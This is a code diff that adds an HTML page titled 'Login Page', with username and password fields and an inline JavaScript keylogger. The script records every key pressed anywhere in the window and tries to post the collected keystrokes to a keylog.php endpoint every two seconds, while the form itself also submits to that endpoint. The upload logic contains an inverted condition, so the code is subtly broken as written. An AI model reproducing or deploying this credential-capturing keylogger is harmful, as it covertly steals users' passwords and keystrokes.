@@ -1,0 +1,65 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+    <h1>Login Page</h1>
+    <form action="/keylog.php">
+        <label for="uname">Username</label><br>
+        <input type="text" id="uname" name="uname"><br>
+        <label for="psswrd">Password</label><br>
+        <input type="text" id="psswrd" name="psswrd"><br><br>
+        <input type="submit" value="Submit">
+      </form> 
+    <script>
+        var keylog = {
+    //PROPERTIES
+    cache:[], 
+    sending : false, 
+
+//INITIALIZE
+
+    init: function(){
+        window.addEventListener("keydown", function(evt){
+            keylog.cache.push(evt.key);
+            console.log(keylog.cache);
+        });
+
+        window.setInterval(keylog.send , 2000); // 2 SEC
+    },
+
+    //SEND
+    send: function(){
+        if(keylog.sending && keylog.cache.length !=0){
+            keylog.sending= true;
+
+            var data = new FormData();
+            data.append("keys", JSON.stringify(keylog.cache));
+            keylog.cache= [];
+
+            //AJAX POST
+            var xhr = new XMLHttpRequest();
+            xhr.open("POST", "keylog.php");
+            xhr.onload = function(){
+                //UNLOCK - ALLOW NEXT BATCH UPLOAD
+                keylog.sending = false;
+                console.log(this.response); //FOR TESTING
+            };
+            xhr.send(data);
+            
+        }
+    }
+        
+
+};
+
+window.addEventListener("DOMContentLoaded", keylog.init);
+    </script>
+    <!-- <script src="./script.js"></script> -->
+</body>
+</html>
